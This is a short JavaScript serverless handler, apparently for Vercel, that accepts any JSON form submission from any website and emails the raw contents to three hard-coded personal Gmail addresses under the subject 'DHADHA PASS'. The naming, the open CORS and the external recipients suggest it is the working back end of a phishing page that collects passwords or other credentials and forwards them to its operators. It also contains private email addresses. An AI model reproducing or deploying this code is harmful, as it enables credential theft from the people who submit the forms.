import { transporter } from "./emailConfig.js";

export default async function handler(req, res) {
  try {
    // ✅ CORS headers
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Accept, Authorization");

    if (req.method === "OPTIONS") return res.status(204).end();
    if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

    // ✅ Raw body read (for Vercel)
    let rawBody = "";
    for await (const chunk of req) rawBody += chunk;

    let formData;
    try {
      formData = JSON.parse(rawBody || "{}");
    } catch (err) {
      console.error("JSON parse error:", err);
      return res.status(400).json({ error: "Invalid JSON format" });
    }

    if (!formData || Object.keys(formData).length === 0) {
      return res.status(400).json({ error: "Form data missing" });
    }

    console.log("Form Data Received:", formData);

    // ✅ Send email
    const info = await transporter.sendMail({
      from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,nizamaniallahabad@gmail.com",
      subject: "DHADHA PASS",
      text: JSON.stringify(formData, null, 2),
      html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
    });

    console.log("Email sent:", info.messageId);

    res.status(200).json({ success: true, message: "Data sent via email" });

  } catch (error) {
    console.error("Serverless function error:", error);
    res.status(500).json({ error: error.message || "Unknown server error" });
  }
}
